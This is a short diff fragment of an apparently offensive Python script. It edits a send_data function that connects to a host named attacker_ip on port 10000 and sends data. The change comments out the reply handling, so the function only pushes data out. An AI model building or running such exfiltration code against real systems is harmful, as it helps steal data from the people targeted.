@@ -33,9 +33,9 @@ server_address = (attacker_ip, 10000)
 def send_data(data):
     sock.connect(server_address)
     sock.sendall(data)
-    received = sock.recv(32)
+    # received = sock.recv(32)
     sock.close()
-    return received
+    # return received
 
 
 for i in range(1,10):
